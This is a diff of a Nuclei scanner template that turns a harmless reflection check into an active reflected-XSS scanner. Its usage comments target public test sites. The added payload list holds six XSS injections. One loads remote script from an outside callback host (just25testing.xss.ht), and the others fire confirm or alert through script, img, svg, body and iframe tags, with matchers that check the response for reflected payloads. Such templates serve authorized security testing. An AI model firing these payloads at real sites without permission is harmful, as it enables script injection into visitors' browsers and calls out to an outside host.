@@ -1,31 +1,54 @@
-id: fuzz-reflection-xss
+id: PARAM-PATH-XSS
+
+#USUAGE     $ echo "http://testphp.vulnweb.com/listproducts.php?cat=" | nuclei -t xss.yaml | awk '{print $6}'  #Single parameter URLs only
+#PATH xss also $ echo "https://brutelogic.com.br/xss.php/" | nuclei -t xss.yaml | awk '{print $6}'
 
 info:
-  name: Basic Reflection Potential XSS Detection
-  author: pdteam
-  severity: low
+  name: Reflected Cross-Site Scripting (XSS)
+  author: 25
+  severity: high
 
 http:
   - method: GET
     path:
-      - "{{BaseURL}}"
+       - '{{BaseURL}}{{payload}}'
+
     payloads:
-      reflection:
-        - "6842'\"><9967"
+       payload: 
+             - '"></script><script/src=https://just25testing.xss.ht></script>'
+             - '"><script>confirm(25)</script>'
+             - '%22%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm(25)%3E'
+             - '"><svg/onload=confirm(25)>'
+             - '"><body/onload=alert(25)>'
+             - '"><iframe/src=javascript:alert(25)>'
+             
     stop-at-first-match: true
-    fuzzing:
-      - part: query
-        type: postfix
-        mode: single
-        fuzz:
-          - "{{reflection}}"
-    matchers-condition: and
+    matchers-condition: or
     matchers:
       - type: word
+        words:
+          - "<script>confirm(25)</script>"
         part: body
-        words:
-          - "{{reflection}}"
+        condition: or
+
       - type: word
-        part: header
         words:
-          - "text/html"
+          - "<img src=x onerror=confirm(25)>"
+        part: body
+        condition: or
+
+      - type: word
+        words:
+          - '<svg/onload=confirm(25)>'
+        part: body
+        condition: or
+
+      - type: word
+        words:
+          - '<body/onload=alert(25)>'
+        part: body
+
+      - type: word
+        words:
+          - '<iframe/src=javascript:alert(25)>'
+        part: body
